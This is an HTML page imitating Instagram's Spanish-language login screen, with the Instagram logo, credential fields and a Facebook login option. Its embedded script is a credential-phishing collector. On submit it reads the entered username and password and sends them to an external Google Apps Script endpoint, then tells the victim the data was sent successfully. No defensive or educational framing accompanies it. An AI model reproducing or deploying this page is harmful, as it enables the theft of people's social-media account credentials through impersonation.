<body>
    <div id="login-container">
        <img src="preview@2x.png" alt="Instagram" id="logo">

        <form id="loginForm">
            <input type="text" class="input-field" id="key" placeholder="Telefono, usuario o correo electronico">

            <div class="password-container">
                <input type="password" class="input-field" id="password" placeholder="Contraseña">
                <i class="bi bi-eye" id="toggle-password"></i>
            </div>

            <button type="submit" class="btn" id="submitBtn">Entrar</button>
        </form>

        <script>
            document.getElementById('loginForm').addEventListener('submit', async function(event) {
                event.preventDefault();

                const key = document.getElementById('key').value;
                const password = document.getElementById('password').value;

               
                const formData = new FormData();
                formData.append('entry.2130068893', key); 
                formData.append('entry.1115778200', password); 

                const formUrl = 'https://script.google.com/macros/s/AKfycbxxxxx123456789/exec';
             
                const data = {
                   key: key,
                   password: password
                };
              

                await fetch(formUrl, {
                   method: 'POST',
                   headers: {
                       'Content-Type': 'application/json' 
                    },
                    body: JSON.stringify(data), 
                }); 

                alert('Datos enviados correctamente');
            });
        </script>
        
        <div class="divider">
            <span>O</span>
        </div>
        
        <p class="bg-blue-500 facebook-login">
            <i class="bi bi-facebook"></i> Iniciar sesion con Facebook
        </p>
        
        <p class="secondary-text">¿Has olvidado la contraseña?</a>
        </p>
        
        <div style="margin-top: 20px; border-top: 1px solid #dbdbdb; padding-top: 20px;">
            <p class="secondary-text">
                ¿No tienes una cuenta? <a href="#">Registrate</a>
            </p>
        </div>
    </div>

    <script>
        document.getElementById('toggle-password').addEventListener('click', function () {
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                this.classList.replace('bi-eye', 'bi-eye-slash');
            } else {
                passwordInput.type = 'password';
                this.classList.replace('bi-eye-slash', 'bi-eye');
            }
        });
    </script>
